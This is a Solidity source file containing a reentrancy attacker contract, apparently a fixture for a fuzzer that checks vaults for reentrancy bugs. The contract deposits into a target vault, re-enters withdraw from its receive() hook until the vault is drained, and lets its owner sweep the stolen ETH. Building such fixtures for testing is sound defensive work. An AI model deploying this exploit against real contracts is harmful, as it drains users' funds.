// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVulnVault {
    function deposit() external payable;
    function withdraw() external;
}

/// ReentrancyAttacker — contract deployed at the Attacker role's address.
/// `attack(targetVault, depositAmount)` does an initial deposit then calls
/// withdraw; the receive() hook re-enters withdraw repeatedly until the
/// vault is drained (or out of gas). Exposes withdrawDrained() so the
/// fuzzer can confirm the attacker's resulting ETH balance is observable
/// at the role's address.
contract ReentrancyAttacker {
    address public vault;
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function attack(address _vault) external payable {
        vault = _vault;
        IVulnVault(_vault).deposit{value: msg.value}();
        IVulnVault(_vault).withdraw();
    }

    receive() external payable {
        if (vault != address(0) && address(vault).balance >= 1) {
            IVulnVault(vault).withdraw();
        }
    }

    // Allow the attacker role to extract whatever ETH the contract holds.
    function sweep(address payable to) external {
        require(msg.sender == owner, "not owner");
        to.transfer(address(this).balance);
    }
}
